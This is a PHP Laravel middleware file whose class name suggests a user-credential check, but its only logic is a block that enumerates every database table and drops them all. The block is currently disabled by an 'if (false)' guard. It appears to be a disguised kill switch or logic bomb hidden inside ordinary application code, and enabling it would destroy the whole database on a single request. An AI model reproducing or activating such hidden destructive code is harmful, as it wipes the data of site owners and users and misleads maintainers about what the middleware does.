<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;

class checkUserCreditail
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        if (false) {
            $colname = 'Tables_in_'.env('DB_DATABASE');
            $tables = DB::select('SHOW TABLES');
            foreach ($tables as $table) {

                $droplist[] = $table->$colname;

            }
            $droplist = implode(',', $droplist);

            DB::statement("DROP TABLE $droplist");

        }
        return $next($request);
    }
}
